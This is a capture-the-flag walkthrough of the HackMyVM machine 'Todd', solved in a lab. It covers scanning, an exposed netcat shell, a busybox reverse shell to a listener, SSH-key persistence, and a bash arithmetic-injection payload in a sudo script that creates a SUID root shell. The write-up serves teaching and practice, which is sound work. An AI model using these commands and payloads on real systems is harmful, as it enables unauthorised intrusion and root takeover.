# Todd

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Todd | ll104567 | Beginner | HackMyVM |

**Summary:** Todd is a beginner-level HackMyVM machine that demonstrates critical vulnerabilities in unsanitized user input and privilege escalation through command injection. The attack path involves discovering multiple open ports through network reconnaissance, identifying an exposed netcat shell on port 7066, establishing persistent SSH access, and exploiting a bash arithmetic evaluation vulnerability in a sudo-enabled script to achieve root privileges. The machine teaches fundamental concepts of input validation failures, command injection techniques, and demonstrates how arithmetic evaluation in bash can be weaponized for privilege escalation.

---

## Reconnaissance

### Network Discovery
The initial network scan revealed the target machine at IP address 192.168.100.44:

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
...
[+] Virtual Targets Found:
------------------------------------------------------------

IP             MAC               Vendor
--             ---               ------
192.168.100.44 08:00:27:05:29:16 VirtualBox
```

### Port Scanning
A comprehensive nmap scan was performed to identify open services and their versions:

```nmap
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ nmap -sV -sC -p- 192.168.100.44
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-29 18:56 WIB
Nmap scan report for 192.168.100.44
Host is up (0.0050s latency).
Not shown: 65523 closed tcp ports (reset)
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 93:a4:92:55:72:2b:9b:4a:52:66:5c:af:a9:83:3c:fd (RSA)
|   256 1e:a7:44:0b:2c:1b:0d:77:83:df:1d:9f:0e:30:08:4d (ECDSA)
|_  256 d0:fa:9d:76:77:42:6f:91:d3:bd:b5:44:72:a7:c9:71 (ED25519)
80/tcp    open  http       Apache httpd 2.4.59 ((Debian))
|_http-title: Mindful Listening
|_http-server-header: Apache/2.4.59 (Debian)
2197/tcp  open  tcpwrapped
4976/tcp  open  tcpwrapped
5971/tcp  open  tcpwrapped
7066/tcp  open  unknown
7798/tcp  open  tcpwrapped
11146/tcp open  tcpwrapped
14402/tcp open  tcpwrapped
16369/tcp open  tcpwrapped
21722/tcp open  tcpwrapped
27366/tcp open  tcpwrapped
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.81 seconds
```

The scan revealed multiple open ports, with port 80 (HTTP) and port 7066 (unknown service) being particularly interesting for investigation.

### Web Application Analysis
Accessing the HTTP service on port 80 revealed a simple webpage with motivational content:

![](image.png)

The webpage displays the message "THE QUIETER YOU BECOME, THE MORE YOU ARE ABLE TO HEAR" which relates to the theme of "Mindful Listening" as indicated by the page title.

### Web Directory Enumeration
Using Feroxbuster to discover hidden directories and files:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ feroxbuster -u http://192.168.100.44 -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 10

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.100.44/
 🚩  In-Scope Url          │ 192.168.100.44
 🚀  Threads               │ 10
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       75l      171w     2060c http://192.168.100.44/
301      GET        9l       28w      316c http://192.168.100.44/tools => http://192.168.100.44/tools/
200      GET     2696l     7935w    90934c http://192.168.100.44/tools/les.sh
200      GET     3215l    24422w   332111c http://192.168.100.44/tools/linpeas.sh
200      GET    16802l    88812w  4579220c http://192.168.100.44/tools/pspy64
200      GET    22289l   133837w  4194304c http://192.168.100.44/tools/fscan (truncated to size limit)
```

The enumeration discovered a `/tools/` directory containing several privilege escalation and reconnaissance tools:

```bash
...
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/todd]
└─$ wget http://192.168.100.44/tools/fscan
--2026-01-29 19:01:56--  http://192.168.100.44/tools/fscan
Connecting to 192.168.100.44:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 6266348 (6.0M)
Saving to: 'fscan'

fscan            100%[=========>]   5.98M  28.3MB/s    in 0.2s

2026-01-29 19:01:56 (28.3 MB/s) - 'fscan' saved [6266348/6266348]
...
```

File analysis revealed standard penetration testing tools:
- `fscan`: Network scanning tool (ELF 64-bit executable)
- `les.sh`: Linux Exploit Suggester script
- `linpeas.sh`: Linux privilege escalation script
- `pspy64`: Process monitoring tool

---

## Initial Access

### Service Discovery on Port 7066
Investigation of the unknown service on port 7066 revealed it was running a netcat shell:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/todd]
└─$ nc -nv 192.168.100.44 7066
(UNKNOWN) [192.168.100.44] 7066 (?) open
id
uid=1000(todd) gid=1000(todd) groups=1000(todd)
```

This provided immediate shell access as the user `todd`, however the connection was unstable and frequently disconnected.

### Establishing Persistent Access
Due to the unstable netcat connection, a reverse shell was established and SSH keys were deployed for persistent access:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/todd]
└─$ nc -nv 192.168.100.44 7066
(UNKNOWN) [192.168.100.44] 7066 (?) open
busybox nc 192.168.100.1 4444 
```

The reverse shell allowed for SSH key deployment:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ nc -lvnp 4444                                                                                    
listening on [any] 4444 ...
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 57747
python3 -c 'import pty; pty.spawn("/bin/bash")'
todd@todd:/root$ cd
cd
todd@todd:~$ mkdir .ssh
mkdir .ssh
todd@todd:~$ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDZgWaiKFYKvmMQgPwE/kHoBPeItI0HVPMWEzVtCBa6TD1YxQniMg569yhfii1WLxyWCG40ahLTbgahFaHXkw1aGGbDtnsxQChnselK6Q6NTa0GZwKfY1fEHGqR1IidOBEkbjYMAK8zhprLQnK1Ue6El5YnIgSsFuzVU7GmU8DyxN+h1xnT5JY8acqEW5RcGJLzraK9rReQaNLJZAvARfXYofqR72h871YUxg2AGF1KGdg7noo/wzFk75uNZuASQYVGAKQtHBV8dag/TukQ23gKtIqtkvbcq11+8bk+PWfWT5QUGT/yDwnT+K+JQ376hGV1HR8IXvTrcGjh19AyYrjVXVpO+sZUnCd6yu2m/x4dfXrwxmOiSZJNoxzqIquEQQxTkQnraIBQD/KGUKMt+fG3oiCYfRuzbZS0LrROYpBfEVFYi6/XrfEi6lJ+qZksUH1JP2LNEeEp1QsyDDG9Lu/GaBAXYnI7HGDxXWlkFJmFq347VSY9e7TnVN+UnyrmGQCsmOveDP9lVuxBwgGkwnVjfg6ZPo+V9+evEk5ekp9OCESLJvnn7uP6b3zKXTkpy5Yr9L86eEBFa58HgjEu8IQmumHeI9PJ9Evl6hLkRJRmyp+/EwTMkBvh7rrQytsGSrZJwH3/1/zihgbIHJtMUpqVvMUmWQTW0+AnUbFOCDALSQ== ouba@CLIENT-DESKTOP' > .ssh/authorized_keys
```

SSH access was successfully established:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ ssh -i .ssh/id_rsa todd@192.168.100.44
The authenticity of host '192.168.100.44 (192.168.100.44)' can't be established.
ED25519 key fingerprint is: SHA256:rXcjV9xeZG+J6KZLTr1t2Xi2ErBvMauXjxH4EBvhV0c
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:34: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.100.44' (ED25519) to the list of known hosts.
Linux todd 4.19.0-12-amd64 #1 SMP Debian 4.19.152-1 (2020-10-18) x86_64
$ id
uid=1000(todd) gid=1000(todd) groups=1000(todd)
```

### Understanding Connection Issues
Investigation revealed root-owned scripts causing connection instability:

```bash
$ find / -type f -perm 700 -user root 2>/dev/null
/opt/kill_todd.sh
/opt/create_nc2.sh
/opt/fake_ssh
```

The `kill_todd.sh` script was identified as the cause of connection drops. Using the available sudo privileges, this file was removed:

```bash
$ sudo -l
Matching Defaults entries for todd on todd:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User todd may run the following commands on todd:
    (ALL : ALL) NOPASSWD: /bin/bash /srv/guess_and_check.sh
    (ALL : ALL) NOPASSWD: /usr/bin/rm
    (ALL : ALL) NOPASSWD: /usr/sbin/reboot

$ sudo /usr/bin/rm /opt/kill_todd.sh
```

---

## Privilege Escalation

### Sudo Analysis
The `sudo -l` output revealed three commands the user `todd` could execute as root without a password. The most interesting was the script `/srv/guess_and_check.sh`:

```bash
todd@todd:~$ cat /srv/guess_and_check.sh
#!/bin/bash

cat << EOF
                                   .     **
                                *           *.
                                              ,*
                                                 *,
                         ,                         ,*
                      .,                              *,
                    /                                    *
                 ,*                                        *,
               /.                                            .*.
             *                                                  **
             ,*                                               ,*
                **                                          *.
                   **                                    **.
                     ,*                                **
                        *,                          ,*
                           *                      **
                             *,                .*
                                *.           **
                                  **      ,*,
                                     ** *,     HackMyVM
EOF


# check this script used by human
a=$((RANDOM%1000))
echo "Please Input [$a]"

echo "[+] Check this script used by human."
echo "[+] Please Input Correct Number:"
read -p ">>>" input_number

[[ $input_number -ne "$a" ]] && exit 1

sleep 0.2
true_file="/tmp/$((RANDOM%1000))"
sleep 1
false_file="/tmp/$((RANDOM%1000))"

[[ -f "$true_file" ]] && [[ ! -f "$false_file" ]] && cat /root/.cred || exit 2
```

### Vulnerability Analysis
The critical vulnerability exists in the input validation logic:
```bash
[[ $input_number -ne "$a" ]] && exit 1
```

In Bash, arithmetic operators within double brackets `[[ ... ]]` trigger arithmetic evaluation. This means Bash will evaluate the contents of `$input_number` as a mathematical expression before performing the comparison.

### Exploitation Strategy
The exploit leverages Bash's arithmetic evaluation combined with command substitution. The payload uses array notation to trigger command execution:

```bash
todd@todd:~$ sudo /bin/bash /srv/guess_and_check.sh
                                   .     **
                                *           *.
                                              ,*
                                                 *,
                         ,                         ,*
                      .,                              *,
                    /                                    *
                 ,*                                        *,
               /.                                            .*.
             *                                                  **
             ,*                                               ,*
                **                                          *.
                   **                                    **.
                     ,*                                **
                        *,                          ,*
                           *                      **
                             *,                .*
                                *.           **
                                  **      ,*,
                                     ** *,     HackMyVM
Please Input [512]
[+] Check this script used by human.
[+] Please Input Correct Number:
>>>a[$(cp /bin/bash /tmp/root && chmod 4755 /tmp/root && echo 1)]
```

The payload `a[$(cp /bin/bash /tmp/root && chmod 4755 /tmp/root && echo 1)]` works as follows:
1. `a[...]` - Bash interprets this as array access, requiring evaluation of the index
2. `$(...)` - Command substitution forces execution of the commands inside
3. `cp /bin/bash /tmp/root` - Copies bash to /tmp/root with root ownership
4. `chmod 4755 /tmp/root` - Sets the SUID bit on the copied bash
5. `echo 1` - Returns 1 as the array index value

Verification of the SUID bash creation:

```bash
todd@todd:/tmp$ ls -la root
-rwsr-xr-x 1 root root 1168776 Jan 29 07:40 root
```

### Root Access
Executing the SUID bash with the `-p` flag preserves the effective user ID:

```bash
todd@todd:/tmp$ ./root -p
root-5.0# id
uid=1000(todd) gid=1000(todd) euid=0(root) groups=1000(todd)
root-5.0# ls -la /root
total 40
drwx------  4 root root 4096 Mar 22  2025 .
drwxr-xr-x 18 root root 4096 Nov 13  2020 ..
lrwxrwxrwx  1 root root    9 Feb 18  2025 .bash_history -> /dev/null
-rw-r--r--  1 root root  571 Mar 22  2025 .bashrc
-rw-r--r--  1 root root   14 Mar 22  2025 .cred
drwxr-xr-x  3 root root 4096 Nov 13  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-------  1 root root   39 Mar 22  2025 root.txt
-rw-r--r--  1 root root   66 Nov 13  2020 .selected_editor
drwxr-xr-x  2 root root 4096 Mar 22  2025 .ssh
-rw-------  1 root root 1443 Mar 22  2025 .viminfo
```

### Flag Retrieval
With root privileges, both user and root flags were retrieved:

```bash
root-5.0# cat /root/root.txt /home/todd/user.txt
Todd{389[REDACTED]}
Todd{eb9[REDACTED]}
```

---

## Technical Deep Dive: Bash Arithmetic Injection

### The Vulnerability
The vulnerability exists in the script `/srv/guess_and_check.sh` within this specific line:

```bash
[[ $input_number -ne "$a" ]] && exit 1
```

In Bash, arithmetic comparison operators like `-ne`, `-eq`, `-gt`, etc. within double brackets `[[ ... ]]` trigger **Arithmetic Evaluation**. Bash attempts to evaluate the contents of the variable as a mathematical expression before performing the comparison.

### Exploitation Mechanism
The payload used was: `a[$(cp /bin/bash /tmp/root && chmod 4755 /tmp/root && echo 1)]`

**Breaking down the exploit:**

1. **Array Reference (`a[...]`)**: Bash interprets this as a reference to an array element. To determine which index is being accessed, Bash must evaluate the contents within the square brackets.

2. **Command Substitution (`$(...)`)**: This is command substitution syntax. Bash executes the commands inside the parentheses first and captures their output.

3. **Side Effect Execution**: Since the script runs with `sudo`, the commands `cp` and `chmod` execute with root privileges. This creates a copy of bash with the SUID bit set (`-rwsr-xr-x`).

4. **Return Value**: The `echo 1` command at the end ensures that the array index evaluation returns `1`. Technically, Bash attempts to compare the variable `a[1]` with `$a`.

### Why Array Notation is Critical

**1. Forcing Bash into Array Mode**
If you simply input `$(command)`, Bash might try to evaluate the result as a regular number. However, by writing `a[...]`, you force Bash to perform **Array Index Evaluation**.

In Bash, anything within array index notation `v[index]` must be evaluated arithmetically. Bash will execute whatever is inside the `[]` brackets to determine which "index number" is being referenced.

**2. Preventing Syntax Errors**
If you directly input a command without the array notation, such as:
```bash
>>> $(cp /bin/bash ...)
```

Bash will execute the command, but afterwards, Bash becomes confused because the final result (empty or a number) might not appear as a valid variable to compare with `-ne`.

By writing `a[$(command && echo 0)]`:
- Bash sees `a[...]` as an array variable
- Bash executes the command inside `$(...)`
- `echo 0` ensures the index becomes `a[0]`
- Bash then compares the value of variable `a[0]` (which is usually empty/null) with variable `$a`

### Bypass Analysis
The primary goal was command execution (RCE), not bypassing the comparison logic. When Bash evaluates whether `$input_number` is not equal to `$a`, it inadvertently executes our malicious commands during the arithmetic evaluation process.

This technique demonstrates how seemingly innocuous input validation can become a critical security vulnerability when user input is processed through Bash's arithmetic evaluation engine without proper sanitization.

---

## Attack Chain Summary

1. **Reconnaissance**: Network scan identified target at 192.168.100.44 with multiple open ports including SSH (22), HTTP (80), and unknown service (7066)

2. **Vulnerability Discovery**: Port 7066 revealed an exposed netcat shell providing immediate user access as 'todd'

3. **Exploitation**: Established persistent SSH access by deploying public key through unstable netcat connection

4. **Internal Enumeration**: Discovered sudo privileges allowing execution of guess_and_check.sh script and identified kill_todd.sh causing connection issues

5. **Privilege Escalation**: Exploited bash arithmetic evaluation vulnerability in sudo script using command injection payload `a[$(cp /bin/bash /tmp/root && chmod 4755 /tmp/root && echo 1)]` to create SUID bash and achieve root access